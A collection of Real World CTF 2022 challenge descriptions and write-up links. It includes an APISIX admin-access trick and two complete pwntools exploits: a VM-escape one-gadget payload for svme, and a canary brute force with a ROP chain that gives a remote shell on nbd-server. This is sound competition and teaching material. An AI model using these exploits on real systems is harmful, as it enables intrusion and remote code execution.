# API6
Description：

Apache APISIX lets you build Cloud-Native Microservices API gateways, delivering the ultimate performance, open source, scalable platform and free remote code execution bugs for all your APIs and microservices.

writeup：

api6 - you can use /apisix/batch-request API to send request that originates from localhost (X-real-ip header) and therefore are allowed by openresty to access /apisix/admin/routes, then just add arbitrary endpoint to read the flag 

# BlackBox
Description：

This is a challenge that is two years late about CVE-2020-14364. Enjoy it :)

writeup：

https://gist.github.com/sampritipanda/a619520f0764f868288361b162e7c67b

https://github.com/5lipper/ctf/tree/master/rwctf20-21

https://gist.github.com/matrizzo/85a9c23424db8a5e4819cdec5cff16ec

# flag
Description：

FreeRTOS+LwIP+ARM+GoAhead

I don't want another backdoor ctf. So I have to say: "There is a backdoor in challange"

The default account in attachment is admin:admin

Hint: flag.bin has a backdoor/bugdoor and you're supposed to take over it. The flag is not embedded in the binary and will be made available to the appliance via network at runtime, see docker-compose.yml in attachment for details.

writeup：

None

# hso-groupie
Description：

Help check how secure our latest PaaS (Pdftohtml-as-a-Service) is!

Pick your favorite bug from this bloody list, or really, just exploit that bug so your exploit would also work on latest Poppler [1] and maybe even KItinerary.

The container image is also available on Docker Hub.

[1] Yeah, turns out propagating bug fixes between different Clone-and-Own codebases takes time :)

https://gitlab.freedesktop.org/poppler/poppler/-/commits/master/poppler/JBIG2Stream.cc

https://hub.docker.com/hsogroupie/pdftohtml

writeup：

https://github.com/Riatre/hso-groupie

# QLaas
Description：

Qiling as a Service.

writeup：

https://www.kalmarunionen.dk/writeups/2022/rwctf/qlaas/

# secured_java

Description：

I just found a safe way to run untrusted Java code!

writeup：

https://www.kalmarunionen.dk/writeups/2022/rwctf/secured-java/

https://github.com/perfectblue/ctf-writeups/tree/master/2022/realworld-ctf-2022/securedjava

# svme

Description：

Professor Terence Parr has taught us how to build a virtual machine. Now it's time to break it!

https://www.slideshare.net/parrt/how-to-build-a-virtual-machine

writeup：

https://lightstack.freemyip.com/posts/realworldctf_svme/

https://blog.bitwarriors.net/blog/real-world-ctf-svme-pwn-93-solves/

```python
#!/usr/bin/env python3
from pwn import *
from struct import pack

if args["REMOTE"]:
    p = remote("47.243.140.252",1337)
else:
    p = process("./svme")

o = {
    "NOOP"    : p32(0),
    "IADD"    : p32(1),   # int add
    "ISUB"    : p32(2),
    "IMUL"    : p32(3),
    "ILT"     : p32(4),   # int less than
    "IEQ"     : p32(5),   # int equal
    "BR"      : p32(6),   # branch
    "BRT"     : p32(7),   # branch if true
    "BRF"     : p32(8),   # branch if true
    "ICONST"  : p32(9),   # push constant integer
    "LOAD"    : p32(10),  # load from local context
    "GLOAD"   : p32(11),  # load from global memory
    "STORE"   : p32(12),  # store in local context
    "GSTORE"  : p32(13),  # store in global memory
    "PRINT"   : p32(14),  # print stack top
    "POP"     : p32(15),  # throw away top of stack
    "CALL"    : p32(16),  # call function at address with nargs,nlocals
    "RET"     : p32(17),  # return value from function
    "HALT"    : p32(18)
}

###################
#  Exploit Code   #
###################

code = b""

# Load stack-leak (code-pointer) onto fake-stack
code += o["LOAD"] 
code += pack("=i",-996)
code += o["LOAD"] 
code += pack("=i",-997)

# Add 0x218 to the lower-bytes part
code += o["ICONST"]
code += pack("=i",0x218) # 0x218 is the offset from code pointer to _start leak
code += o["IADD"]

code += o["STORE"]
code += pack("=i",-993)
code += o["STORE"]
code += pack("=i",-992)

# Actually reading the data now
code += o["GLOAD"]
code += p32(1)
code += o["GLOAD"]
code += p32(0)

# Calculating pos of one-gadget
code += o["ICONST"]
code += p32(0x270b3)
code += o["ISUB"]

code += o["ICONST"]
code += p32(0xe6c81)
code += o["IADD"]

# Loading code-pointer-values to stack (-40 = RET addr)
code += o["LOAD"] 
code += pack("=i",-996)
code += o["LOAD"] 
code += pack("=i",-997)

# Calculating location of ret
code += o["ICONST"]
code += pack("=i",40)
code += o["ISUB"]

 # Writing lower 4 bytes of ret-addr
code += o["STORE"]
code += pack("=i",-993)
code += o["STORE"]
code += pack("=i",-992)

# Writing one-gadget addr
code += o["GSTORE"]
code += p32(0)
code += o["GSTORE"]
code += p32(1)

# Ending program
code += o["HALT"]

code = code.ljust(128*4, b"\x00")
p.send(code)
p.sendline("id")
if args["REMOTE"]:
    p.sendline("cat /flag")

p.interactive()
```

# TheRiseOfSky
Description：

Lo and behold, here be live streaming on the SKY810.

writeup:

None

# UnstrustZone
Description：

It is clearly not worth your trust.

The default username is root.

The start script of challenge

```bash
qemu-system-aarch64 \
        -nographic \
        -smp 2 \
        -machine virt,secure=on,gic-version=3,virtualization=false \
        -cpu cortex-a57 \
        -d unimp -semihosting-config enable=on,target=native \
        -m 1024 \
        -bios bl1.bin \
        -initrd rootfs.cpio.gz \
        -kernel Image -no-acpi \
        -append console="ttyAMA0,38400 keep_bootcon root=/dev/vda2  -object rng-random,filename=/dev/urandom,id=rng0 -device virtio-rng-pci,rng=rng0,max-bytes=1024,period=1000" \
        -netdev user,id=vmnic -device virtio-net-device,netdev=vmnic \
        -no-reboot \
        -monitor null
```

writeup:

https://github.com/perfectblue/ctf-writeups/tree/master/2022/realworld-ctf-2022/untrustZone

# WhoMovedMyBlock

Description：

On Linux, network block device (NBD) is a network protocol that can be used to forward a block device (typically a hard disk or partition) from one machine to a second machine. As an example, a local machine can access a hard disk drive that is attached to another computer.

https://github.com/NetworkBlockDevice/nbd

writeup：

remote stack-based buffer overflow in handle_info 

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

HOST = "47.242.113.232" #"localhost"
PORT = 49240 #10809

INIT_PASSWD = b"NBDMAGIC"

NBD_FLAG_FIXED_NEWSTYLE = 1<<0
NBD_FLAG_NO_ZEROES      = 1<<1

opts_magic = 0x49484156454F5054
rep_magic  = 0x3e889045565a9

NBD_OPT_GO = 7
NBD_REP_FLAG_ERROR = 1<<31
NBD_REP_ERR_UNSUP  = 1|NBD_REP_FLAG_ERROR
NBD_REP_ERR_POLICY = 2|NBD_REP_FLAG_ERROR

context.log_level = "error"

def parse_response(io):
  magic = u64(io.recv(8), endian="big")
  opt = u32(io.recv(4), endian="big")
  reply_type = u32(io.recv(4), endian="big")
  datasize = u32(io.recv(4), endian="big")
  data = io.recv(datasize)

def send_request(opt, datasize, namelen, name, io):
  # first send the header
  header = p64(opts_magic, endian="big") + \
      p32(opt, endian="big") + p32(datasize, endian="big")

  #input("## attach ##")
  io.send(header)

  io.send(p32(datasize, endian="big"))
  io.send(p32(namelen, endian="big"))

  parse_response(io)

  io.send(name)

  io.send(b"D" * (namelen-4))
  #io.send(b"D" * namelen)

  io.send(p16(0))

  parse_response(io)

def get_canary():
  canary = [0] * 8
  for j in range(8):
    for i in range(1<<8):
      canary[j] = i
      try:
        io = remote(HOST, PORT)

        # start negotiation, first receive the init passwd
        buf = io.recv(8)
        assert(buf == INIT_PASSWD)

        log.info("received INIT_PASSWD")

        # now parse the magic
        magic = u64(io.recv(8), endian="big")
        assert(magic == opts_magic)

        log.success(f"received opts magic {magic:#x}")

        # parse global flags
        gflags = u16(io.recv(2), endian="big")
        log.info(f"global flags are {gflags:#x}")

        cflags = NBD_FLAG_FIXED_NEWSTYLE
        if (gflags & NBD_FLAG_NO_ZEROES):
          cflags |= NBD_FLAG_NO_ZEROES

        # send client flags
        io.send(p32(cflags, endian="big"))

        length = 1032+4+1+j
        payload  = b"A"*1028

        # copy previous values
        for k in range(j):
          payload += p8(canary[k])

        # add current
        payload += p8(canary[j])

        payload += b"D" * (length-4-len(payload))

        namelen  = length

        #payload += b"B" * 8
        #payload += b"C" * ((datasize - 6) - len(payload))
        send_request(NBD_OPT_GO, length, namelen, payload, io)

        header = p64(opts_magic, endian="big") + \
            p32(NBD_OPT_GO, endian="big") + p32(0, endian="big")

        io.send(header)
        io.send(p32(0, endian="big"))
        io.send(p32(0, endian="big"))

        parse_response(io)
        io.close()

        print(f"Ok! found canary[{j:d}] = {i:02x}")
        canary[j] = i
        break
      except EOFError:
        continue
  return canary

canary = get_canary()

#canary = [0, 0x32, 0xd7, 0xfd, 0xd8, 0xe, 0x32, 0xcb]

def get_base():
  base = [0] * 8
  for j in range(8):
    for i in range(1<<8):
      base[j] = i
      try:
        io = remote(HOST, PORT)

        buf = io.recv(8)
        assert(buf == INIT_PASSWD)

        log.info("received INIT_PASSWD")

        magic = u64(io.recv(8), endian="big")
        assert(magic == opts_magic)

        log.success(f"received opts magic {magic:#x}")

        gflags = u16(io.recv(2), endian="big")
        log.info(f"global flags are {gflags:#x}")

        cflags = NBD_FLAG_FIXED_NEWSTYLE
        if (gflags & NBD_FLAG_NO_ZEROES):
          cflags |= NBD_FLAG_NO_ZEROES

        io.send(p32(cflags, endian="big"))

        length = 1032+4+16+1+j
        payload  = b"A"*1028

        # canary
        for p in range(8):
          payload += p8(canary[p])

        payload += p64(0xdeadbeef)

        # copy previous values
        for k in range(j):
          payload += p8(base[k])

        # add current
        payload += p8(base[j])

        payload += b"D" * (length-4-len(payload))

        namelen  = length 

        send_request(NBD_OPT_GO, length, namelen, payload, io)

        header = p64(opts_magic, endian="big") + \
            p32(NBD_OPT_GO, endian="big") + p32(0, endian="big")

        io.send(header)
        io.send(p32(0, endian="big"))
        io.send(p32(0, endian="big"))

        parse_response(io)

        io.close()

        print(f"Ok! found base[{j:d}] = {i:02x}")
        base[j] = i
        break

      except EOFError:
        continue
  return base

base = get_base()

def get_libc():
  io = remote(HOST, PORT)

  buf = io.recv(8)
  assert(buf == INIT_PASSWD)

  log.info("received INIT_PASSWD")

  magic = u64(io.recv(8), endian="big")
  assert(magic == opts_magic)

  log.success(f"received opts magic {magic:#x}")

  gflags = u16(io.recv(2), endian="big")
  log.info(f"global flags are {gflags:#x}")

  cflags = NBD_FLAG_FIXED_NEWSTYLE
  if (gflags & NBD_FLAG_NO_ZEROES):
    cflags |= NBD_FLAG_NO_ZEROES

  io.send(p32(cflags, endian="big"))

  length = 1032+4+64+8
  payload  = b"A"*1028

  # canary
  for p in range(8):
    payload += p8(canary[p])

  payload += p64(0xdeadbeef00)
  payload += p64(0xdeadbeef01)
  payload += p64(512)
  payload += p64(base + 0x12DA8)
  payload += p64(4)
  payload += p64(0xdeadbeef05)
  payload += p64(0xdeadbeef06)
  payload += p64(base + 0xC202)

  payload += b"D" * (length-4-len(payload))

  namelen  = length

  send_request(NBD_OPT_GO, length, namelen, payload, io)

  header = p64(opts_magic, endian="big") + \
      p32(NBD_OPT_GO, endian="big") + p32(0, endian="big")

  io.send(header)
  io.send(p32(0, endian="big"))
  io.send(p32(0, endian="big"))

  #parse_response(io)

  libc = u64(io.recv(8))


  #libc = u64(io.recv(8))

  io.close()
  return libc

#get_canary()
#get_base()

#base = [0x74, 0xf2, 0x67, 0x9e, 0xfe, 0x55, 0, 0]

base = u64(b"".join([p8(i) for i in base])) - 0xf274
print(f"nbd-server mapped at {base:#x}")

libc = get_libc() - 0x110cc0
print(f"glibc mapped at {libc:#x}")

io = remote(HOST, PORT)

buf = io.recv(8)
assert(buf == INIT_PASSWD)

log.info("received INIT_PASSWD")

magic = u64(io.recv(8), endian="big")
assert(magic == opts_magic)

log.success(f"received opts magic {magic:#x}")

gflags = u16(io.recv(2), endian="big")
log.info(f"global flags are {gflags:#x}")

cflags = NBD_FLAG_FIXED_NEWSTYLE
if (gflags & NBD_FLAG_NO_ZEROES):
  cflags |= NBD_FLAG_NO_ZEROES

io.send(p32(cflags, endian="big"))

dup2=libc+0x111a30
poprdi=base+0x4a58
poprsi=base+0x4798
binsh=libc+0x1b75aa
system=libc+0x55410

rop_chain  = p64(poprdi) + p64(4) + p64(poprsi) + p64(0) + p64(dup2)
rop_chain += p64(poprdi) + p64(4) + p64(poprsi) + p64(1) + p64(dup2)
rop_chain += p64(poprdi) + p64(4) + p64(poprsi) + p64(2) + p64(dup2)
rop_chain += p64(poprdi) + p64(binsh) + p64(system)

length = 1032+4+64+len(rop_chain)
payload  = b"A"*1028

# canary
for p in range(8):
  payload += p8(canary[p])

payload += p64(0xdeadbeef00)
payload += p64(0xdeadbeef01)
payload += p64(512)
payload += p64(base + 0x12DA8)
payload += p64(4)
payload += p64(0xdeadbeef05)
payload += p64(0xdeadbeef06)
payload += rop_chain

payload += b"D" * (length-4-len(payload))

namelen  = length

send_request(NBD_OPT_GO, length, namelen, payload, io)

header = p64(opts_magic, endian="big") + \
    p32(NBD_OPT_GO, endian="big") + p32(0, endian="big")

io.send(header)
io.send(p32(0, endian="big"))
io.send(p32(0, endian="big"))

io.interactive()
```

# Others writeup
https://r3kapig.com/writeup/20220125-rwctf4/

